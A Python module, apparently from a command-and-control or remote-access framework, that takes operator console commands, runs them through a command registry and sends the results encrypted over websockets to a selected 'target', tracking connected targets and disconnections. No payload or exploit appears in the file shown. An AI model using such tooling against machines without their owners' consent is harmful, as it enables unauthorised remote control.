import json
import asyncio
import time
from cryptoUtil import sendSecretMessage
from socksUtil import getCurrent
import socksUtil
from modules.abstractModule import Module
import modules.consoleCommands.getCommands as commands_mod
import modules.ConsoleServer as server


class ConsoleInWeb(Module):
    type = 0

    def __init__(self):
        pass

    async def handleMessage(self, websocket, msg):
        msg['timestamp'] = time.time()
        if getCurrent():
            msg['host'] = getCurrent().remote_ip
        else:
            msg['host'] = 'disconected'
        server.consoleOut = json.dumps(msg)

    async def sendMessage(self, websocket, msg):
        try:
            cmd = commands_mod.getCommands()[msg.split(" ")[0]]
        except:
            cmd = commands_mod.getCommands()[commands_mod.default]
        result = cmd.execute(msg)
        if websocket:
            if cmd.sendsMessage:
                try:
                    await sendSecretMessage(websocket, result)
                except Exception as e:
                    if websocket in socksUtil.sockets:
                        if socksUtil.sockets.index(websocket) == socksUtil.current:
                            socksUtil.current = 0
                        socksUtil.removeSocket(websocket)
                    await self.handleMessage(None, {
                        "outputType": "error",
                        "text": f"target disconnected while sending command: {e}"
                    })
            else:
                await self.handleMessage(None, result)
        else:
            if isinstance(result, dict):
                await self.handleMessage(None, result)
            else:
                await self.handleMessage(None, {})
        return result